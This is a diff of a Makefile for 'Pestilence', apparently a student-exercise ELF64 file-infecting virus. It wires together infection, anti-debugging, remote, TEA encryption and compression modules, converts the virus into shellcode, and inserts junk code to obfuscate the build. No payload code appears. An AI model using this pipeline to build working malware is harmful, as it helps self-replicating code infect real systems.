@@ -1,23 +1,38 @@
 NAME = Pestilence
 
-COMPILER = gcc
 FLAGS = -MD -fno-stack-protector -fPIC -fPIE 
 
 SRC_DIR				= .
 TMP_DIR				= .tmp
 OBJ_DIR				= $(TMP_DIR)/obj
-OBJ_LIB_DIR			= $(OBJ_DIR)/lib
-TMP_LIB_DIR			= $(TMP_DIR)/lib
 
-TABLE_C = virus_table.c
+TABLE_C = $(TMP_DIR)/table.c
+LIBFLAGS = -I lib -I lib/ft_lib -I lib/crypto -I lib/formats -I lib/hacks
+VIRUS = virus
 
-SRC_C = virus.c lib/lib.c lib/infect.c lib/elf64.c lib/remote.c lib/antidebug.c $(TABLE_C)
-SRC_S = virus_start.s virus_bonus.s
+FTLIB_SRC = ft_io.c ft_string.c ft_lib.c
+FORMATS_SRC = elf64.c
+CRYPTO_SRC = compression.c tea_encrypt.c
+HACKS_SRC = antidebug.c remote.c
+INFECT_SRC = infect.c
+
+FTLIB = $(addprefix lib/ft_lib/, $(FTLIB_SRC))
+FORMATS = $(addprefix lib/formats/, $(FORMATS_SRC))
+CRYPTO = $(addprefix lib/crypto/, $(CRYPTO_SRC))
+HACKS = $(addprefix lib/hacks/, $(HACKS_SRC))
+INFECT = $(addprefix lib/, $(INFECT_SRC))
+
+OBJ_LIBS = $(addprefix $(OBJ_DIR)/, lib/ft_lib lib/ft_formats lib/crypto lib/hacks lib)
+
+SRC_C = virus/main.c $(FTLIB) $(INFECT) $(FORMATS) $(CRYPTO) $(HACKS) $(TABLE_C)
+SRC_S = virus/start.s lib/crypto/tea_decrypt.s
+
 OBJ	=	$(addprefix $(OBJ_DIR)/, $(SRC_C:.c=.o)) \
 		$(addprefix $(OBJ_DIR)/, $(SRC_S:.s=.o)) \
 
-SRC_INF_C = pestilence.c lib/lib.c lib/infect.c lib/elf64.c
-OBJ_INF	=	$(addprefix $(OBJ_DIR)/, $(SRC_INF_C:.c=.o))
+SRC_INF_C = infector/main.c $(FTLIB) $(INFECT) $(FORMATS)
+
+OBJ_INF	= $(addprefix $(OBJ_DIR)/, $(SRC_INF_C:.c=.o))
 
 DEP =		$(addprefix $(OBJ_DIR)/, $(SRC_C:.c=.d)) \
 		$(addprefix $(OBJ_DIR)/, $(SRC_INF_C:.c=.d))
@@ -25,12 +40,14 @@ DEP =		$(addprefix $(OBJ_DIR)/, $(SRC_C:.c=.d)) \
 VIRUS = $(TMP_DIR)/virus.template
 VIRUS_X = $(TMP_DIR)/virus_shellcode.c
 
-LD_RULES = virus_linking.lds
+LD_RULES = virus/rules.lds
 
-all: $(NAME)
+all: nop $(NAME)
 
-$(NAME): $(OBJ_INF) $(VIRUS_X)
-	$(COMPILER) -o $(NAME) $(OBJ_INF) $(VIRUS_X)
+nop:
+
+$(NAME):  $(VIRUS_X) $(OBJ_INF)
+	gcc -o $(NAME) $(OBJ_INF) $(VIRUS_X)
 
 $(VIRUS_X): $(VIRUS)
 	cp $< virus_shellcode
@@ -46,15 +63,8 @@ $(TMP_DIR):
 
 $(OBJ_DIR):
 	mkdir -p $@
-
-$(OBJ_LIB_DIR):
-	mkdir -p $@
-
-$(TMP_LIB_DIR):
-	mkdir -p $@
-
-$(TMP_DIR)/%.s: $(SRC_DIR)/%.c | $(OBJ_DIR) $(TMP_LIB_DIR)
-	gcc $(FLAGS) -S $< -o $@
+	find -type d -links 2 -exec mkdir -p $(OBJ_DIR)"/{}" \;
+	rm -rf $(OBJ_DIR)/others
 
 ##
 ## GARBAGE CODE
@@ -68,28 +78,28 @@ $(GARBAGE_CF): $(TMP_DIR)
 $(TMP_DIR)/virus.s.g.s: $(TMP_DIR)/virus.s $(GARBAGE_CF)
 	#cp $< $@
 	# nm --defined-only .tmp/obj/virus.o | grep -v '\.' | grep -i ' t ' | cut -d ' ' -f 3
-	./scripts/add_garbage $< -cf $(GARBAGE_CF) -p 200 -l decrypt do_infection entry virus
+	./others/scripts/add_garbage $< -cf $(GARBAGE_CF) -p 200 -l decrypt do_infection entry virus
 	#./scripts/add_garbage $< -p 200 -l .ALL
 
 $(TMP_DIR)/lib/lib.s.g.s: $(TMP_DIR)/lib/lib.s $(GARBAGE_CF)
 	#cp $< $@
-	./scripts/add_garbage $< -cf $(GARBAGE_CF) -p 200 -l ft_open
+	./others/scripts/add_garbage $< -cf $(GARBAGE_CF) -p 200 -l ft_open
 	#./scripts/add_garbage $< -cf $(GARBAGE_CF) -p 200 -l add_base call close contains d_isdir d_isfile execve exit ffree fget fork fput free getdents getenv getpid lseek malloc _malloc malloc_shared open print println printnb printnbln ptrace read restore_rt scmp signal slen snbr sncmp startswith str_equal waitpid write xstat
 
 $(TABLE_C): $(GARBAGE_CF)
-	./scripts/gen_garbage_table -n `cat $(GARBAGE_CF)` -o $@
+	./others/scripts/gen_garbage_table -n `cat $(GARBAGE_CF)` -o $@
 
 ##
 ## END
 ##
 
-$(OBJ_DIR)/%.o: $(TMP_DIR)/%.s.g.s | $(OBJ_DIR) $(OBJ_LIB_DIR)
-	gcc $(FLAGS) -c $< -o $@
+$(OBJ_DIR)/%.o: $(TMP_DIR)/%.s.g.s | $(OBJ_DIR)
+	gcc $(FLAGS) $(LIBFLAGS) -c $< -o $(OBJ_DIR)/$(notdir $@)
 
-$(OBJ_DIR)/%.o: $(SRC_DIR)/%.c | $(OBJ_DIR) $(OBJ_LIB_DIR)
-	$(COMPILER) $(FLAGS) -c $< -o $@
+$(OBJ_DIR)/%.o: %.c | $(OBJ_DIR)
+	gcc $(FLAGS) $(LIBFLAGS) -c $< -o $@
 
-$(OBJ_DIR)/%.o: $(SRC_DIR)/%.s | $(OBJ_DIR) $(OBJ_LIB_DIR)
+$(OBJ_DIR)/%.o: %.s | $(OBJ_DIR)
 	nasm -f elf64 $< -o $@
 
 clean:
@@ -101,7 +111,6 @@ clean:
 
 fclean: clean
 	rm -rf $(NAME)
-	rm -rf woody
 
 re: fclean
 	echo $(DEP)
